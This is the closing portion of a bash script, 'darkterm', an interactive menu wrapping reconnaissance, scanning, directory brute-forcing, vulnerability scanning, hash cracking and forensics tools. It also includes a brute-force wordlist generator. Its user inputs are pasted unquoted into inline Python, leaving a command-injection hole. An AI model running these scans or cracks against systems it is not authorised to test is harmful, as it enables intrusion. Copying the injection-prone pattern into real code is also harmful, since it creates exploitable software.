                echo -e "  ${C}GPG Operations:${D}"
                echo -e "    [1] Generate key"
                echo -e "    [2] Encrypt file"
                echo -e "    [3] Decrypt file"
                echo -e "    [4] Sign file"
                echo -e "    [5] Verify signature"
                read -p "  Operation: " gop
                case $gop in
                    1) gpg --full-generate-key 2>&1 ;;
                    2) read -p "  File: " f; read -p "  Recipient: " r; gpg -e -r "$r" "$f" 2>&1 ;;
                    3) read -p "  File: " f; gpg -d "$f" 2>&1 ;;
                    4) read -p "  File: " f; gpg --sign "$f" 2>&1 ;;
                    5) read -p "  File: " f; gpg --verify "$f" 2>&1 ;;
                esac
                ;;
            4)
                echo ""
                echo -e "  ${C}Encoding Operations:${D}"
                echo -e "    [1] Base64 encode     [2] Base64 decode"
                echo -e "    [3] Hex encode        [4] Hex decode"
                echo -e "    [5] URL encode        [6] URL decode"
                read -p "  Operation: " eop; read -p "  Input: " str
                case $eop in
                    1) echo -n "$str" | base64 ;;
                    2) echo "$str" | base64 -d ;;
                    3) echo -n "$str" | xxd -p ;;
                    4) echo "$str" | xxd -r -p ;;
                    5) python3 -c "import urllib.parse; print(urllib.parse.quote('$str'))" ;;
                    6) python3 -c "import urllib.parse; print(urllib.parse.unquote('$str'))" ;;
                esac
                ;;
            5)
                read -p "  String: " str
                echo -e "\n  ${C}=== Hash Results ===${D}"
                echo -e "  ${G}MD5   :${D} $(echo -n "$str" | md5sum | cut -d' ' -f1)"
                echo -e "  ${G}SHA1  :${D} $(echo -n "$str" | sha1sum | cut -d' ' -f1)"
                echo -e "  ${G}SHA256:${D} $(echo -n "$str" | sha256sum | cut -d' ' -f1)"
                echo -e "  ${G}SHA512:${D} $(echo -n "$str" | sha512sum | cut -d' ' -f1)"
                ;;
            6)
                read -p "  Target host:port: " target
                echo | openssl s_client -connect "$target" -servername "${target%%:*}" 2>/dev/null | openssl x509 -noout -dates -issuer -subject 2>&1
                ;;
            0) return ;;
            *) echo -e "  ${R}Invalid option${D}" ;;
        esac
        pause
    done
}

# ═══════════════════════════════════════════════════════════════
#  MODULE 7: FORENSICS & ANALYSIS
# ═══════════════════════════════════════════════════════════════
module_forensics() {
    while true; do
        echo -e "\n  ${C}══════ FORENSICS & ANALYSIS ══════${D}\n"
        echo -e "  ${G}[1]${D}  File Analysis     - File type/metadata/strings"
        echo -e "  ${G}[2]${D}  Hashdeep          - File hash comparison"
        echo -e "  ${G}[3]${D}  APKLeaks          - APK secret scanner"
        echo -e "  ${G}[4]${D}  Log Analyzer      - System log analysis"
        echo -e "  ${G}[0]${D}  Back"
        echo ""
        read -p "  $(echo -e ${G}darkterm${D}:${C}forensics${D}\\$ ) " choice

        case $choice in
            1)
                read -p "  File path: " file
                log_action "File analysis: $file"
                echo -e "\n  ${C}=== File Info ===${D}"
                file "$file" 2>&1
                ls -la "$file" 2>&1
                echo -e "\n  ${C}=== Strings (first 50) ===${D}"
                strings "$file" | head -50 2>&1
                ;;
            2)
                require_pkg hashdeep hashdeep || { pause; continue; }
                read -p "  Directory: " dir
                log_action "Hashdeep: $dir"
                hashdeep -r "$dir" 2>&1 | tee "$LOOT_DIR/hashdeep_$(date +%s).txt"
                ;;
            3)
                require_pkg apkleaks apkleaks || { pause; continue; }
                read -p "  APK file: " apk
                read -p "  Output file (Enter for auto): " outfile
                log_action "APKLeaks: $apk"
                if [[ -n "$outfile" ]]; then
                    apkleaks -f "$apk" -o "$outfile" 2>&1
                else
                    apkleaks -f "$apk" 2>&1
                fi
                ;;
            4)
                read -p "  Log file (default: /var/log/syslog): " logfile
                logfile="${logfile:-/var/log/syslog}"
                if [[ -f "$logfile" ]]; then
                    echo -e "\n  ${G}Lines   :${D} $(wc -l < "$logfile")"
                    echo -e "  ${G}Errors  :${D} $(grep -ci 'error' "$logfile")"
                    echo -e "  ${G}Warnings:${D} $(grep -ci 'warn' "$logfile")"
                    echo -e "\n  ${C}=== Recent Errors ===${D}"
                    grep -i 'error' "$logfile" | tail -20 2>&1
                else
                    echo -e "  ${R}[!] Log file not found${D}"
                fi
                ;;
            5)
                log_action "Process monitor"
                echo -e "\n  ${C}=== Processes ===${D}"
                ps aux 2>&1 | head -30
                echo -e "\n  ${C}=== Listening Ports ===${D}"
                ss -tulnp 2>&1 || netstat -tulnp 2>&1
                ;;
            0) return ;;
            *) echo -e "  ${R}Invalid option${D}" ;;
        esac
        pause
    done
}

# ═══════════════════════════════════════════════════════════════
#  MODULE 8: UTILITIES
# ═══════════════════════════════════════════════════════════════
module_utils() {
    while true; do
        echo -e "\n  ${C}══════ UTILITIES ══════${D}\n"
        echo -e "  ${G}[1]${D}  Wordlist Generator"
        echo -e "  ${G}[2]${D}  Password Generator"
        echo -e "  ${G}[3]${D}  IP Info            (local/public/geo)"
        echo -e "  ${G}[4]${D}  HTTP Header Analysis"
        echo -e "  ${G}[5]${D}  SSH Key Manager"
        echo -e "  ${G}[6]${D}  View Activity Logs"
        echo -e "  ${G}[7]${D}  System Info & Tool Status"
        echo -e "  ${G}[0]${D}  Back"
        echo ""
        read -p "  $(echo -e ${G}darkterm${D}:${C}utils${D}\\$ ) " choice

        case $choice in
            1)
                read -p "  Output file: " outfile
                read -p "  Min length (default 6): " minlen
                read -p "  Max length (default 10): " maxlen
                read -p "  Charset [l]ower [u]pper [n]umber [s]pecial (e.g. ln): " cs
                cs="${cs:-ln}"
                log_action "Wordlist gen: min=$minlen max=$maxlen charset=$cs"
                python3 -c "
import itertools, string
chars = ''
if 'l' in '$cs': chars += string.ascii_lowercase
if 'u' in '$cs': chars += string.ascii_uppercase
if 'n' in '$cs': chars += string.digits
if 's' in '$cs': chars += string.punctuation
if not chars: chars = string.ascii_lowercase + string.digits
count = 0
with open('$outfile', 'w') as f:
    for length in range(${minlen:-6}, ${maxlen:-10}+1):
        for combo in itertools.product(chars, repeat=length):
            f.write(''.join(combo) + '\n')
            count += 1
            if count % 100000 == 0: print(f'  Generated {count}...')
print(f'  [+] Saved: $outfile ({count} entries)')
" 2>&1
                ;;
            2)
                read -p "  Length (default 20): " len
                read -p "  Count (default 5): " count
                echo -e "\n  ${C}=== Generated Passwords ===${D}"
                for i in $(seq 1 "${count:-5}"); do
                    echo -n "  "
                    openssl rand -base64 "$(( ${len:-20} * 3 / 4 ))" | tr -d '\n'
                    echo ""
                done
                ;;
            3)
                echo -e "\n  ${C}=== Local IP ===${D}"
                ip addr show 2>/dev/null | grep "inet " | grep -v 127.0.0.1
                echo -e "\n  ${C}=== Public IP ===${D}"
                echo -n "  "
                curl -s ifconfig.me 2>&1
                echo ""
                echo -e "\n  ${C}=== Geolocation ===${D}"
                curl -s "http://ip-api.com/json" 2>&1 | python3 -m json.tool 2>/dev/null
                ;;
            4)
                read -p "  URL: " url
                echo -e "\n  ${C}=== Headers ===${D}"
                curl -sI "$url" 2>&1
                echo -e "\n  ${C}=== Response Info ===${D}"
                curl -s -o /dev/null -w "  HTTP: %{http_code}\n  Time: %{time_total}s\n  Size: %{size_download}B\n  Redirect: %{redirect_url}\n" "$url" 2>&1
                ;;
            5)
                echo ""
                echo -e "  ${C}SSH Key Operations:${D}"
                echo -e "    [1] Generate key pair"
                echo -e "    [2] List keys"
                echo -e "    [3] Copy key to server"
                echo -e "    [4] Fingerprints"
                read -p "  Operation: " sop
                case $sop in
                    1) read -p "  Type (ed25519/rsa): " t; read -p "  Comment: " c
                       ssh-keygen -t "${t:-ed25519}" -C "$c" -f "$HOME/.ssh/id_${t:-ed25519}" 2>&1 ;;
                    2) ls -la "$HOME/.ssh/" 2>&1 ;;
                    3) read -p "  User@host: " h; ssh-copy-id "$h" 2>&1 ;;
                    4) ssh-keygen -lf "$HOME/.ssh/id_ed25519.pub" 2>/dev/null || ssh-keygen -lf "$HOME/.ssh/id_rsa.pub" 2>/dev/null ;;
                esac
                ;;
            6)
                if [[ -f "$LOG_DIR/darkterm.log" ]]; then
                    echo -e "\n  ${C}=== Activity Log (last 50) ===${D}"
                    tail -50 "$LOG_DIR/darkterm.log" 2>&1
                else
                    echo -e "  ${Y}No logs yet${D}"
                fi
                ;;
            7)
                echo -e "\n  ${C}=== System ===${D}"
                echo -e "  ${G}OS     :${D} $(uname -o) $(uname -r) ($(uname -m))"
                echo -e "  ${G}Shell  :${D} $SHELL"
                echo ""
                echo -e "  ${G}Disk   :${D}"; df -h /data 2>&1
                echo -e "  ${G}Memory :${D}"; free -h 2>&1 || head -3 /proc/meminfo
                echo ""
                echo -e "  ${C}=== Installed Security Tools ===${D}"
                for tool in nmap nikto sqlmap hydra john hashcat msfconsole nc whois dig curl openssl ssh nuclei httpx gobuster ffuf dirb wpscan wafw00f theharvester amass subfinder brutespray fscan kerbrute proxychains4 dnsx dnsmap; do
                    if command -v "$tool" &>/dev/null; then
                        printf "    ${G}[+]${D} %-18s\n" "$tool"
                    else
                        printf "    ${R}[-]${D} %-18s\n" "$tool"
                    fi
                done
                ;;
            0) return ;;
            *) echo -e "  ${R}Invalid option${D}" ;;
        esac
        pause
    done
}

# ═══════════════════════════════════════════════════════════════
#  MODULE 9: QUICK SCANS (Automated)
# ═══════════════════════════════════════════════════════════════
module_quick() {
    while true; do
        echo -e "\n  ${C}══════ QUICK SCANS ══════${D}\n"
        echo -e "  ${G}[1]${D}  Full Recon        - Domain > DNS > Subdomains > HTTP"
        echo -e "  ${G}[2]${D}  Web Audit         - Headers/WAF/Dirs/Vulns"
        echo -e "  ${G}[3]${D}  Network Map       - Host discovery + port scan"
        echo -e "  ${G}[4]${D}  Password Audit    - Hash ID + crack"
        echo -e "  ${G}[5]${D}  SSL Audit         - Certificate + cipher analysis"
        echo -e "  ${G}[0]${D}  Back"
        echo ""
        read -p "  $(echo -e ${G}darkterm${D}:${C}quick${D}\\$ ) " choice

        case $choice in
            1)
                read -p "  Target domain: " domain
                log_action "Full recon: $domain"
                echo -e "\n  ${C}[Phase 1] WHOIS${D}"
                whois "$domain" 2>&1 | head -25
                echo -e "\n  ${C}[Phase 2] DNS Records${D}"
                for t in A MX TXT NS SOA; do
                    echo -e "  ${G}--- $t ---${D}"
                    dig "$domain" "$t" +short 2>&1
                done
                echo -e "\n  ${C}[Phase 3] Subdomains${D}"
                if command -v subfinder &>/dev/null; then
                    subfinder -d "$domain" -silent 2>&1 | tee "$LOOT_DIR/recon_${domain}_subs.txt"
                fi
                echo -e "\n  ${C}[Phase 4] HTTP Probe${D}"
                if command -v httpx &>/dev/null && [[ -f "$LOOT_DIR/recon_${domain}_subs.txt" ]]; then
                    httpx -l "$LOOT_DIR/recon_${domain}_subs.txt" -silent -status-code -title 2>&1
                fi
                echo -e "\n  ${G}[+] Done. Results in $LOOT_DIR/${D}"
                ;;
            2)
                read -p "  Target URL: " url
                log_action "Web audit: $url"
                echo -e "\n  ${C}[1/4] Headers${D}"
                curl -sI "$url" 2>&1
                echo -e "\n  ${C}[2/4] WAF Detection${D}"
                if command -v wafw00f &>/dev/null; then wafw00f "$url" 2>&1; fi
                echo -e "\n  ${C}[3/4] Directory Scan${D}"
                if command -v gobuster &>/dev/null; then
                    local scan_wl="$(resolve_wl)"
                    if [[ -n "$scan_wl" && -f "$scan_wl" ]]; then
                        gobuster dir -u "$url" -w "$scan_wl" -t 20 -q 2>&1 | head -25
                    fi
                fi
                echo -e "\n  ${C}[4/4] Vuln Scan${D}"
                if command -v nuclei &>/dev/null; then
                    nuclei -u "$url" -severity medium,high,critical -silent 2>&1 | head -20
                fi
                ;;
            3)
                read -p "  Target (IP/CIDR): " target
                log_action "Network map: $target"
                require_pkg nmap nmap || { pause; continue; }
                echo -e "\n  ${C}[1/2] Host Discovery${D}"
                nmap -sn "$target" 2>&1
                echo -e "\n  ${C}[2/2] Port Scan${D}"
                nmap -T4 -F "$target" 2>&1
                ;;
            4)
                read -p "  Hash value: " hash
                log_action "Password audit: $hash"
                echo -e "\n  ${C}[1/2] Hash ID${D}"
                if command -v hashid &>/dev/null; then hashid "$hash" 2>&1; fi
                echo -e "\n  ${C}[2/2] Crack Attempt${D}"
                echo "$hash" > $TMPDIR/dt_hash.txt
                if command -v john &>/dev/null; then
                    local crack_wl="$(resolve_wl)"
                    if [[ -n "$crack_wl" && -f "$crack_wl" ]]; then
                        john --wordlist="$crack_wl" $TMPDIR/dt_hash.txt 2>&1
                        john --show $TMPDIR/dt_hash.txt 2>&1
                    fi
                fi
                rm -f $TMPDIR/dt_hash.txt
                ;;
            5)
                read -p "  Target host:port: " target
                log_action "SSL audit: $target"
                echo -e "\n  ${C}[1/3] Certificate${D}"
                echo | openssl s_client -connect "$target" -servername "${target%%:*}" 2>/dev/null | openssl x509 -noout -text 2>&1 | grep -E "Issuer|Subject|Not Before|Not After|Public-Key|Signature"
                echo -e "\n  ${C}[2/3] Connection${D}"
                echo | openssl s_client -connect "$target" -servername "${target%%:*}" 2>/dev/null | grep -E "Cipher|Protocol|Session"
                echo -e "\n  ${C}[3/3] Security Headers${D}"
                curl -sI "https://${target}" 2>&1 | grep -iE "strict-transport|content-security|x-frame|x-content|x-xss|referrer-policy"
                ;;
            0) return ;;
            *) echo -e "  ${R}Invalid option${D}" ;;
        esac
        pause
    done
}

# ═══════════════════════════════════════════════════════════════
#  MAIN MENU
# ═══════════════════════════════════════════════════════════════
main_menu() {
    while true; do
        banner
        echo -e "  ${W}[1]${D}  ${C}Reconnaissance & OSINT${D}"
        echo -e "  ${W}[2]${D}  ${C}Network Scanning & Enumeration${D}"
        echo -e "  ${W}[3]${D}  ${C}Web Application Testing${D}"
        echo -e "  ${W}[4]${D}  ${C}Password Attacks & Cracking${D}"
        echo -e "  ${W}[5]${D}  ${C}Exploitation & Post-Exploitation${D}"
        echo -e "  ${W}[6]${D}  ${C}Cryptography & Encoding${D}"
        echo -e "  ${W}[7]${D}  ${C}Forensics & Analysis${D}"
        echo -e "  ${W}[8]${D}  ${C}Utilities${D}"
        echo -e "  ${W}[9]${D}  ${C}Quick Scans (Automated)${D}"
        echo -e "  ${W}[0]${D}  ${R}Exit${D}"
        echo ""
        echo -e "  ${Y}Logs : $LOG_DIR/darkterm.log${D}"
        echo -e "  ${Y}Loot : $LOOT_DIR/${D}"
        echo ""
        read -p "  $(echo -e ${G}darkterm${D}:${B}~${D}\\$ ) " choice

        case $choice in
            1) module_recon ;;
            2) module_network ;;
            3) module_web ;;
            4) module_password ;;
            5) module_exploit ;;
            6) module_crypto ;;
            7) module_forensics ;;
            8) module_utils ;;
            9) module_quick ;;
            0)
                echo ""
                echo -e "  ${R}[*] With great power comes great responsibility.${D}"
                echo -e "  ${G}[*] Stay ethical. Stay legal.${D}"
                echo ""
                log_action "darkterm exited"
                exit 0
                ;;
            *) echo -e "  ${R}Invalid option${D}"; sleep 1 ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════════
log_action "darkterm started"
main_menu
